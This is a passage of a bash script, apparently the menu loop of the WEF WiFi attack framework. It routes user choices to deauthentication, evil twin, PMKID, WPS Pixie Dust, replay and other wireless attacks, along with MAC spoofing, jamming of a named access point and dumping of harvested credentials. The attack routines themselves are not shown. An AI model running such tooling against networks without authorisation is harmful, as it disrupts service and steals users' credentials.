        sleep 0.09
      elif [ "${correct_counter}" == "2" ]; then
        clear; correct_counter="0"
        #tput civis
        all_banners
        echo -e "\n${blueC}Type '${yC}help${blueC}' to view more functions${endC}"
        dir=$(pwd)
        active_card; card_status; mac_status
        echo -e "\n${blueC}[${yC}1${blueC}] Beacon Flood Attack\t\t\t[${yC}10${blueC}] Pixie Dust Attack${endC}"
        echo -e "${blueC}[${yC}2${blueC}] Deauthentication Attack\t\t[${yC}11${blueC}] Caffe-Latte Attack${endC}"
        echo -e "${blueC}[${yC}3${blueC}] Authentication Attack\t\t[${yC}12${blueC}] ChopChop Attack${endC}"
        echo -e "${blueC}[${yC}4${blueC}] PMKID Attack\t\t\t[${yC}13${blueC}] Michael Exploitation Attack${endC}"
        echo -e "${blueC}[${yC}5${blueC}] Passive Attack\t\t\t[${yC}14${blueC}] Replay Attack${endC}"
        echo -e "${blueC}[${yC}6${blueC}] Randomize MAC address\t\t[${yC}15${blueC}] Null Pin Attack${endC}"
        echo -e "${blueC}[${yC}7${blueC}] Start network card${endC}"
        echo -e "${blueC}[${yC}8${blueC}] Evil Twin Attack${endC}"
        echo -e "${blueC}[${yC}9${blueC}] Attacks info${endC}"
      fi

      correct_counter="0"
      echo -ne "\n${blueC}[${yC}WiFi${blueC}] Choose an option >${endC} " && read option
      time_counter="1"

      if [ "$option" == "1" ] || [ "$option" == "beacon" ] || [ "$option" == "beacon flood" ] || [ "$option" == "beacon-flood" ] || [ "$option" == "beaconflood" ] || [ "$option" == "Beacon" ] || [ "$option" == "Beacon Flood" ] || [ "$option" == "b" ]; then
        sleep 0.15
        type_of_attack="Beacon Flood Attack"
        if [ "$(check_interface_mode)" == "monitor" ]; then
          sleep 0.15; beacon_flood
        else
          correct_counter="3"
          log_monitor_is_disabled
        fi

      elif [ "$option" == "2" ] || [ "$option" == "deauth" ] || [ "$option" == "deauthentication" ] || [ "$option" == "deauth attack" ] || [ "$option" == "deauth-attack" ] || [ "$option" == "deauthentication-attack" ] || [ "$option" == "Deauthentication" ] || [ "$option" == "d" ]; then
        sleep 0.15
        type_of_attack="Deauthentication Attack"
        if [ "$(check_interface_mode)" == "monitor" ]; then
          sleep 0.15; deauth_attack
        else
          correct_counter="3"
          log_monitor_is_disabled
        fi

      elif [ "$option" == "3" ] || [ "$option" == "auth" ] || [ "$option" == "authentication" ] || [ "$option" == "auth attack" ] || [ "$option" == "auth-attack" ] || [ "$option" == "authentication-attack" ] || [ "$option" == "Authentication" ] || [ "" == "a" ]; then
        sleep 0.15
        type_of_attack="Authentication Attack"
        if [ "$(check_interface_mode)" == "monitor" ]; then
          sleep 0.15; auth_attack
        else
          correct_counter="3"
          log_monitor_is_disabled
        fi

      elif [ "$option" == "4" ] || [ "$option" == "pmkid" ] || [ "$option" == "pmkid attack" ] || [ "$option" == "pmkid-attack" ] || [ "$option" == "PMKID" ]; then
        sleep 0.15
        type_of_attack="PMKID Attack"
        if [ "$(check_interface_mode)" == "monitor" ]; then
          sleep 0.15; pmkid_attack
        else
          correct_counter="3"
          color_output_ln "*" "Your card is not in monitor mode."
          echo -e "${blueC}[${yC}*${blueC}] Please before doing any attack press the ${yC}Start network card${blueC} option${endC}"
        fi

      elif [ "$option" == "5" ] || [ "$option" == "passive" ] || [ "$option" == "passive attack" ] || [ "$option" == "stealthy" ] || [ "$option" == "stealthy attack" ] || [ "$option" == "passive-attack" ] || [ "$option" == "Passive" ] || [ "$option" == "Stealthy" ]; then
        sleep 0.15
        type_of_attack="Passive/Stealthy Attack"
        if [ "$(check_interface_mode)" == "monitor" ]; then
          sleep 0.15; passive_attack
        else
          correct_counter="3"
          log_monitor_is_disabled
        fi

      elif [ "${card_check}" != "${netCard}" ] && [ "$option" == "7" ] || [ "$option" == "start" ] || [ "$option" == "up" ] || [ "$option" == "start card" ] || [ "$option" == "start-card" ] || [ "$option" == "Start" ]; then
        sleep 0.15
        if [ "$start_counter" == "1" ]; then
          correct_counter="3"
          echo -e "\n${yC}Interface already in monitor mode${endC}"
        else
          card_setup
        fi

      elif [ "$option" == "7" ] || [ "$option" == "start" ] || [ "$option" == "up" ] || [ "$option" == "start card" ] || [ "$option" == "start-card" ] || [ "$option" == "Start" ]; then
        option=""
        good_output_ln "+" "Network card already in monitor mode"

      elif [ "$option" == "8" ] || [ "$option" == "evil twin" ] || [ "$option" == "evil-twin" ] || [ "$option" == "eviltwin" ] || [ "$option" == "evil" ] || [ "$option" == "evil twin attack" ] || [ "$option" == "evil-twin-attack" ] || [ "$option" == "Evil" ] || [ "$option" == "EvilTwin" ] || [ "$option" == "Evil Twin" ] || [ "$option" == "Evil-Twin" ] || [ "$option" == "e" ]; then
        sleep 0.15
        if [ "$(check_interface_mode)" == "monitor" ]; then
          sleep 0.15; evilTwin
        else
          correct_counter="3"
          log_monitor_is_disabled
        fi

      elif [ "$option" == "9" ] || [ "$option" == "list" ] || [ "$option" == "help attacks" ] || [ "$option" == "attacks" ] || [ "$option" == "Attacks" ]; then
        correct_counter="3"
        sleep 0.1; clear
        all_banners; sleep 0.1
        functions_info; sleep 0.1

      elif [ "$option" == "10" ] || [ "$option" == "pixie" ] || [ "$option" == "pixie dust" ] || [ "$option" == "pixie-dust" ] || [ "$option" == "Pixie" ] || [ "$option" == "Pixie Dust" ]; then
        sleep 0.15
        type_of_attack="Pixie Dust Attack"
        if [ "$(check_interface_mode)" == "monitor" ]; then
          sleep 0.15; pixie_dust
        else
          correct_counter="3"
          log_monitor_is_disabled
        fi

      elif [ "$option" == "11" ] || [ "$option" == "caffe" ] || [ "$option" == "caffe latte" ] || [ "$option" == "caffe-latte" ] || [ "$option" == "Caffe-Latte" ] || [ "$option" == "Caffe Latte" ] || [ "$option" == "CaffeLatte" ]; then
        sleep 0.15
        type_of_attack="Caffe Latte Attack"
        if [ "$(check_interface_mode)" == "monitor" ]; then
          sleep 0.15; caffe-latte
        else
          correct_counter="3"
          log_monitor_is_disabled
        fi

      elif [ "$option" == "12" ] || [ "$option" == "chopchop" ] || [ "$option" == "chopchop-atack" ] || [ "$option" == "ChopChop" ]; then
        sleep 0.15
        type_of_attack="ChopChop Attack"
        if [ "$(check_interface_mode)" == "monitor" ]; then
          sleep 0.15; chopchop
        else
          correct_counter="3"
          log_monitor_is_disabled
        fi

      elif [ "$option" == "13" ] || [ "$option" == "michael" ] || [ "$option" == "michael-attack" ] || [ "$option" == "Michael" ] || [ "$option" == "Michael Exploitation" ] || [ "$option" == "m" ]; then
        sleep 0.15
        type_of_attack="Michael Shutdown Exploitation Attack"
        if [ "$(check_interface_mode)" == "monitor" ]; then
          sleep 0.15; michael
        else
          correct_counter="3"
          log_monitor_is_disabled
        fi

      elif [ "$option" == "14" ] || [ "$option" == "replay" ] || [ "$option" == "replay-attack" ] || [ "$option" == "replay attack" ] || [ "$option" == "Replay" ] || [ "$option" == "Replay Attack" ] || [ "$option" == "r" ]; then
        sleep 0.15
        type_of_attack="Replay Attack"
        if [ "$(check_interface_mode)" == "monitor" ]; then
          sleep 0.15; replay
        else
          correct_counter="3"
          log_monitor_is_disabled
        fi

      elif [ "$option" == "15" ] || [ "$option" == "null" ] || [ "$option" == "nullpin" ] || [ "$option" == "null pin" ] || [ "$option" == "null-pin" ] || [ "$option" == "Null" ] || [ "$option" == "Null Pin" ] || [ "$option" == "n" ]; then
        sleep 0.15
        type_of_attack="Null Pin Attack"
        if [ "$(check_interface_mode)" == "monitor" ]; then
          sleep 0.15; null-pin
        else
          correct_counter="3"
          log_monitor_is_disabled
        fi

      elif [ "$option" == "exit" ] || [ "$option" == "exi" ] || [ "$option" == "quit" ] || [ "$option" == "qui" ] || [ "$option" == "salir" ] || [ "$option" == "sortir" ]; then
        ctrl_c
      fi

      if [ "${correct_counter}" != "3" ]; then
        for word in "${words[@]}"; do
          if [ "${option}" == "${word}" ]; then
            correct_counter="2"
          fi
        done
      fi

      if [ "$option" == "help" ] || [ "$option" == "?" ] || [ "$option" == "Help" ]; then
        correct_counter="3"
        listHelp

      elif [ "$option" == "clear" ] || [ "$option" == "cls" ]; then
        correct_counter="3"
        clear

      elif [ "$option" == "panel" ]; then
        correct_counter="3"; sleep 0.15
        showPanel

      elif [ "$option" == "6" ] || [ "$option" == "randomize mac" ] || [ "$option" == "randomize" ] || [ "$option" == "mac" ] || [ "$option" == "randomize-mac" ] || [ "$option" == "Randomize" ] || [ "$option" == "random" ]; then
        correct_counter="3"
        if [ "$(check_interface_mode)" == "monitor" ]; then
          sleep 0.3; mac_randomizer
          changed_mac=$(macchanger -s ${netCard} | grep "Curren" | awk '{print $3}') # Get new MAC address
          vendor=$(macchanger -s ${netCard} | grep "Curren" | awk '{print $2}' FS="(") # Get vendor from "macchanger" output

          echo -e "\n${blueC}[${yC}*${blueC}] New MAC: ${greenC}${changed_mac} ${blueC}(${vendor}${endC}"; sleep 0.1
        else
          color_output_ln "*" "Your card is not in monitor mode."
          echo -e "${blueC}[${yC}*${blueC}] Please before randomizing your MAC, press the ${yC}Start network card${blueC} option${endC}"
        fi

      elif [ "$option" == "load bluetooth" ] || [ "$option" == "load blue" ]; then
        correct_counter="3"
        echo -e "\nOption in development!"
        # blue_main

      elif [ "$option" == "load wifi" ]; then
        correct_counter="3"; sleep 0.1
        echo -e "\n${yC}Wifi module already loaded${endC}"

      elif [ "$option" == "modules" ] || [ "$option" == "load" ]; then
        correct_counter="3"
        echo -e "\n${yC}\tModules"
        echo -e "\t-------${blueC}"
        echo -e " \twifi"
        echo -e " \tbluetooth"
        echo -e "\n Load a module: load <module_name>${endC}"

      elif [ "$option" == "scan" ] || [ "$option" == "scanner" ]; then
        correct_counter="3"
        if [ "$(check_interface_mode)" == "monitor" ]; then
          ap_scan
        else
          log_monitor_is_disabled
        fi

      elif [ "$option" == "list" ]; then
        correct_counter="3"
        list_aps

      elif [ "$option" == "chipsets" ] || [ "$option" == "chipset" ]; then
        correct_counter="3"
        chipsets_panel

      elif [ "$(echo ${option} | awk '{print $1}')" == "enable" ] && [ "$(echo ${option} | awk '{print $2}')" == "auto" ]; then
        correct_counter="3"
        echo -e "0 0 * * sun root /opt/wef/extra/delete-creds.sh" >> /etc/crontab # Add cronjob which executes every week and removes harvested creds
        good_output_ln "+" "Auto credentials deletion enabled"

      elif [ "$(echo ${option} | awk '{print $1}')" == "disable" ] && [ "$(echo ${option} | awk '{print $2}')" == "auto" ]; then
        correct_counter="3"
        cat /etc/crontab | grep -v "/opt/wef" | sponge /etc/crontab
        good_output_ln "+" "Auto credentials deletion disabled"

      elif [ "$option" == "info" ] || [ "$option" == "status" ]; then
        correct_counter="3"; sleep 0.15
        active_card
        card_status
        mac_status

      elif [ "$option" == "update" ]; then
        correct_counter="3"; echo
        progress_bar 2 0.3 "*" "Checking the latest version"
        sleep 0.2
        if [ "$(curl -s -X GET 'https://raw.githubusercontent.com/D3Ext/WEF/main/images/version.txt')" != "${program_version}" ]; then
          echo -ne "\n${blueC}[${greenC}+${blueC}] New version found. Do you want to update WEF? [${yC}y${blueC}/${yC}n${blueC}]: ${endC}" && read update_option
          if [ "${update_option}" == "y" ] || [ "${update_option}" == "yes" ]; then
            bash /opt/wef/update.sh &>/dev/null
            good_output_ln "+" "Update completed successfully"
          fi
        else
          good_output_ln "+" "This is the latest version"
        fi

      elif [ "$(echo ${option} | awk '{print $1}')" == "inhibit" ]; then
        correct_counter="3"

        if [ ! "$(echo ${option} | sed "s/^[^ ]* //")" ]; then # Check is user has provided an AP name
          color_output_ln "*" "Please especify a valid AP name to inhibit its connections"
        elif [ "$(check_interface_mode)" == "monitor" ]; then
          ap_to_inhibit=$(echo ${option} | sed "s/^[^ ]* //")
          echo
          inhibitor
        else
          log_monitor_is_disabled
        fi

      elif [ "$option" == "verbose" ] || [ "$option" == "v" ]; then
        correct_counter="3"; sleep 0.1; verbose="1"
        echo -e "\n${blueC}\tOutput verbose ON${endC}"

      elif [ "$option" == "noverbose" ] || [ "$option" == "no-verbose" ] || [ "$option" == "no verbose" ]; then
        correct_counter="3"; sleep 0.1; verbose="0"
        echo -e "\n${blueC}\tOutput verbose OFF${endC}"

      elif [ "$option" == "dump creds" ] || [ "$option" == "dump-creds" ] || [ "$option" == "dumpcreds" ] || [ "$option" == "dump" ] || [ "$option" == "check" ]; then
        correct_counter="3"; sleep 0.1
        dumpCreds

      elif [ "$option" == "banner" ] | [ "$option" == "banners" ]; then
        correct_counter="3"; echo
        all_banners

      elif [ "$(echo $option | awk '{print $1}')" == "gps" ] && [ "$(echo $option | awk '{print $2}')" ]; then
        correct_counter="3"; sleep 0.1
        echo -e "\nOption in development"
#				gps_spoof

      elif [ "$option" == "extra" ]; then
        correct_counter="3"
        echo -e "${yC}\n\tCommand\t\t\tDescription"
        echo -e "\t-------\t\t\t-----------${endC}"
        echo -e "\t${blueC}gps <coordinates>\t- If you have a HackRF plugged to your PC you can do a gps spoofing attack in a wide nearby range"

      elif [ "$option" == "exec" ] || [ "$option" == "command" ] || [ "$option" == "execute" ]; then
        correct_counter="3"; sleep 0.15
        exec_commands

      elif [ "$option" == "version" ]; then
        correct_counter="3"
        echo -e "\nwef v${program_version} for linux (https://github.com/D3Ext/WEF)"
        echo -e "Created by D3Ext <d3ext@proton.me>\n"
      fi

      if [ "$correct_counter" == "0" ] && [ "$option" != "" ]; then
        color_output_ln "X" "Unknown option, type 'help'"; sleep 0.08
      fi

    done
  else
    helpPanel
  fi
else
  echo -e "${yC} __      _____ ___ "
  echo -e " \ \    / / __| __|"
  echo -e "  \ \/\/ /| _|| _| "
  echo -e "   \_/\_/ |___|_|  ${endC}"
  color_output_ln "X" "Please, execute the program as root\n"
  exit 1
fi

